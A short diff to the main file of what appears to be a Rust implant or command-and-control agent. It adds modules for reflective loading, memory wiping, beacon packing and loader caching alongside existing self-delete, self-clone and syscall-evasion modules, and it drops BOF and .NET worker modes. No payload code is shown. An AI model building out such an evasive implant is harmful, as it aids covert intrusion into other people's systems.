@@ -24,25 +24,21 @@ mod features {
     pub mod screenshot;
     pub mod selfdelete;
     pub mod selfclone;
+    pub mod loadLoader;
 }
 mod hellshall;
 mod selfprotect;
 mod worker;
 mod helpers;
+mod mem_wipe;
+mod reflective_loader;
+mod beacon_pack;
+mod loader_cache;
 
 fn main() {
-    // Worker subprocess mode — run payload and exit without any agent init.
     let args: Vec<String> = std::env::args().collect();
     if args.len() >= 2 {
         match args[1].as_str() {
-            "--worker-bof" => {
-                worker::run_bof_worker();
-                return;
-            }
-            "--worker-dot" => {
-                worker::run_dot_worker();
-                return;
-            }
             "--worker-py" => {
                 worker::run_py_worker();
                 return;
